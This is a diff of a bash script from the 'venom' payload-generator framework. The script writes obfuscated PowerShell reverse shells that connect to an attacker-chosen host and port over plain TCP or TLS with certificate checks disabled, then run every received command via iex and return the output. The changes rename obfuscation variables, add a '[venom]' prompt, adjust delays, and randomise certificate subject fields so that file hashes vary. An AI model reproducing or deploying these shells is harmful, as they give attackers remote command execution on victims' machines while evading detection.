@@ -12659,7 +12659,7 @@ echo "\$socket = new-object \$PSArgException('$lhost', $lport);if(\$socket -eq \
 echo "\$writer = new-object System.IO.\$icmpv6(\$stream);\$buffer = new-object System.Byte[] 1024;" >> $IPATH/output/$NaM.ps1
 echo "\$comm = new-object \$NewObjectCommand;" >> $IPATH/output/$NaM.ps1
 echo "do{" >> $IPATH/output/$NaM.ps1
-echo "	\$writer.Write((pwd).Path + '> ');" >> $IPATH/output/$NaM.ps1
+echo "	\$writer.Write('[venom] ' + (pwd).Path + '> ');" >> $IPATH/output/$NaM.ps1
 echo "	\$writer.Flush();" >> $IPATH/output/$NaM.ps1
 echo "	\$read = \$null;" >> $IPATH/output/$NaM.ps1
 echo "	while(\$stream.DataAvailable -or (\$read = \$stream.Read(\$buffer, 0, 1024)) -eq \$null){};" >> $IPATH/output/$NaM.ps1
@@ -12861,7 +12861,6 @@ if [ "$persistence" = "Dont Add Persistence" ]; then
 fi
 
 
-
 ## Build Reverse TCP Powershell Shell (OpenSSL).
 echo "${BlueF}[☠]${white} Writting OpenSSL reverse shell to output."${Reset};sleep 2
 echo "<#" > $IPATH/output/$NaM.ps1
@@ -12870,36 +12869,46 @@ echo "Framework: venom v1.0.17 - shinigami" >> $IPATH/output/$NaM.ps1
 echo "#>" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
 echo "Start-Sleep -Milliseconds 300" >> $IPATH/output/$NaM.ps1
-echo "\$Uudt = \"tneilCpcT.stekcoS.teN\";\$Cert = \$Uudt.ToCharArray();[Array]::Reverse(\$Cert);" >> $IPATH/output/$NaM.ps1
-echo "\$NewObjectComm = (\$Cert -Join '');\$Phone = \"gnidocnEiicsA.txeT.metsyS\";\$CharArray = \$Phone.ToCharArray();" >> $IPATH/output/$NaM.ps1
-echo "[Array]::Reverse(\$CharArray);\$PSArgExc = (\$CharArray -Join '');" >> $IPATH/output/$NaM.ps1
+echo "\$Vault = \"tneilCpcT.stekcoS.teN\";\$Certificate = \$Vault.ToCharArray();[Array]::Reverse(\$Certificate);" >> $IPATH/output/$NaM.ps1
+echo "\$NewComObject = (\$Certificate -Join '');\$tls64 = \"gnidocnEiicsA.txeT.metsyS\";\$CharArray = \$tls64.ToCharArray();" >> $IPATH/output/$NaM.ps1
+echo "[Array]::Reverse(\$CharArray);\$PSArgsBuffer = (\$CharArray -Join '');" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
 echo "Start-Sleep -Milliseconds 200" >> $IPATH/output/$NaM.ps1
-echo "\$socket = New-Object \$NewObjectComm('$lhost', $lport)" >> $IPATH/output/$NaM.ps1
+echo "\$socket = New-Object \$NewComObject('$lhost', $lport)" >> $IPATH/output/$NaM.ps1
 echo "\$stream = \$socket.GetStream()" >> $IPATH/output/$NaM.ps1
 echo "\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))" >> $IPATH/output/$NaM.ps1
 echo "\$sslStream.AuthenticateAsClient('$CN', \$null, \"Tls12\", \$false)" >> $IPATH/output/$NaM.ps1
 echo "        \$writer = new-object System.IO.StreamWriter(\$sslStream)" >> $IPATH/output/$NaM.ps1
-echo "        \$writer.Write((pwd).Path + '> ')" >> $IPATH/output/$NaM.ps1
+echo "        \$writer.Write('[venom] ' + (pwd).Path + '> ')" >> $IPATH/output/$NaM.ps1
 echo "        \$writer.flush()" >> $IPATH/output/$NaM.ps1
 echo "        [byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
 echo "while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/$NaM.ps1
-echo "   \$data = (New-Object -TypeName \$PSArgExc).GetString(\$bytes,0, \$i);" >> $IPATH/output/$NaM.ps1
+echo "   \$data = (New-Object -TypeName \$PSArgsBuffer).GetString(\$bytes,0, \$i);" >> $IPATH/output/$NaM.ps1
 echo "   \$sendback = (iex \$data | Out-String ) 2>&1;" >> $IPATH/output/$NaM.ps1
-echo "   \$sendback2 = \$sendback + (pwd).Path + '> ';" >> $IPATH/output/$NaM.ps1
+echo "   \$sendback2 = \$sendback + '[venom] ' + (pwd).Path + '> ';" >> $IPATH/output/$NaM.ps1
 echo "   \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);" >> $IPATH/output/$NaM.ps1
 echo "   \$sslStream.Write(\$sendbyte,0,\$sendbyte.Length);\$sslStream.Flush()" >> $IPATH/output/$NaM.ps1
 echo "}" >> $IPATH/output/$NaM.ps1
 
 
-## Generate SSL certificate (openssl)
 cd $IPATH/output
+## Generate SSL certificate (openssl)
+# Ramdomly chose the openssl settings (to make diferent SHA)
+conv=$(cat /dev/urandom | tr -dc '1-3' | fold -w 1 | head -n 1)
+if [ "$conv" = "1" ]; then
+   days="245";contry="US";localidade="Boston";LTDR="Michigan"
+elif [ "$conv" = "2" ]; then
+   days="365";contry="PT";localidade="Lisbon";LTDR="Estremadura"
+else 
+   days="180";contry="FR";localidade="Paris";LTDR="Champs Elysee"
+fi
+
 ## Delete old certs to prevent future errors.
 rm $IPATH/output/cert.pem > /dev/nul 2>&1
 rm $IPATH/output/key.pem > /dev/nul 2>&1
 echo "${BlueF}[☠]${white} Building SSL certificates (openssl) .."${Reset};sleep 2
-xterm -T " Building SSL certificates " -geometry 110x23 -e "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj \"/C=PT/ST=Estremadura/L=Lisbon/O=Global Security/OU=IT Department/CN=$CN\""
+xterm -T " Building SSL certificates " -geometry 110x23 -e "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days $days -nodes -subj \"/C=$contry/ST=$LTDR/L=$localidade/O=Global Security/OU=IT Department/CN=$CN\""
 echo "${BlueF}[☠]${white} venom-main/output/key.pem + cert.pem ([${GreenF}OK${white}])${white} ..";sleep 2
 cd $IPATH
 
@@ -13867,25 +13876,25 @@ echo "Obfuscated Reverse OpenSSL Shell" >> $IPATH/output/Client.ps1
 echo "Framework: venom v1.0.17 - shinigami" >> $IPATH/output/Client.ps1
 echo "#>" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
-echo "Start-Sleep -Milliseconds 700" >> $IPATH/output/Client.ps1
+echo "Start-Sleep -Milliseconds 300" >> $IPATH/output/Client.ps1
 echo "\$Waudt = \"tneilCpcT.stekcoS.teN\";\$Bin = \$Waudt.ToCharArray();[Array]::Reverse(\$Bin);" >> $IPATH/output/Client.ps1
 echo "\$NewObjectCommand = (\$Bin -Join '');\$Microphone = \"gnidocnEiicsA.txeT.metsyS\";\$CharArray = \$Microphone.ToCharArray();" >> $IPATH/output/Client.ps1
-echo "[Array]::Reverse(\$CharArray);\$PSArgException = (\$CharArray -Join '');" >> $IPATH/output/Client.ps1
+echo "[Array]::Reverse(\$CharArray);\$PSArgsBuffer = (\$CharArray -Join '');" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
 echo "\$socket = New-Object \$NewObjectCommand('$lhost', $lport)" >> $IPATH/output/Client.ps1
 echo "\$stream = \$socket.GetStream()" >> $IPATH/output/Client.ps1
 echo "\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))" >> $IPATH/output/Client.ps1
 echo "\$sslStream.AuthenticateAsClient('$CN', \$null, \"Tls12\", \$false)" >> $IPATH/output/Client.ps1
 echo "        \$writer = new-object System.IO.StreamWriter(\$sslStream)" >> $IPATH/output/Client.ps1
-echo "        \$writer.Write((pwd).Path + '> ')" >> $IPATH/output/Client.ps1
+echo "        \$writer.Write('[venom] ' + (pwd).Path + '> ')" >> $IPATH/output/Client.ps1
 echo "        \$writer.flush()" >> $IPATH/output/Client.ps1
 echo "        [byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
-echo "Start-Sleep -Milliseconds 500" >> $IPATH/output/Client.ps1
+echo "Start-Sleep -Milliseconds 250" >> $IPATH/output/Client.ps1
 echo "while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/Client.ps1
-echo "   \$data = (New-Object -TypeName \$PSArgException).GetString(\$bytes,0, \$i);" >> $IPATH/output/Client.ps1
+echo "   \$data = (New-Object -TypeName \$PSArgsBuffer).GetString(\$bytes,0, \$i);" >> $IPATH/output/Client.ps1
 echo "   \$sendback = (iex \$data | Out-String ) 2>&1;" >> $IPATH/output/Client.ps1
-echo "   \$sendback2 = \$sendback + (pwd).Path + '> ';" >> $IPATH/output/Client.ps1
+echo "   \$sendback2 = \$sendback + '[venom] ' + (pwd).Path + '> ';" >> $IPATH/output/Client.ps1
 echo "   \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);" >> $IPATH/output/Client.ps1
 echo "   \$sslStream.Write(\$sendbyte,0,\$sendbyte.Length);\$sslStream.Flush()" >> $IPATH/output/Client.ps1
 echo "}" >> $IPATH/output/Client.ps1
@@ -13901,14 +13910,14 @@ echo "${BlueF}[☠]${white} Building SSL certificates (openssl)"${Reset};sleep 2
 ## Ramdomly chose the openssl settings (to make diferent SHA)
 conv=$(cat /dev/urandom | tr -dc '1-3' | fold -w 1 | head -n 1)
 if [ "$conv" = "1" ]; then
-   days="245";contry="US";localidade="Boston"
+   days="245";contry="US";localidade="Boston";LTDR="Michigan"
 elif [ "$conv" = "2" ]; then
-   days="365";contry="PT";localidade="Lisbon"
+   days="365";contry="PT";localidade="Lisbon";LTDR="Estremadura"
 else 
-   days="105";contry="FR";localidade="Paris"
+   days="180";contry="FR";localidade="Paris";LTDR="Champs Elysee"
 fi
 
-xterm -T " Building SSL certificates " -geometry 110x23 -e "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days $days -nodes -subj \"/C=$contry/ST=Estremadura/L=$localidade/O=Global Security/OU=IT Department/CN=$CN\""
+xterm -T " Building SSL certificates " -geometry 110x23 -e "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days $days -nodes -subj \"/C=$contry/ST=$LTDR/L=$localidade/O=Global Security/OU=IT Department/CN=$CN\""
 echo "${BlueF}[${YellowF}i${BlueF}]${white} venom/output/key.pem + cert.pem ([${GreenF}OK${white}])";sleep 2
 cd $IPATH
 
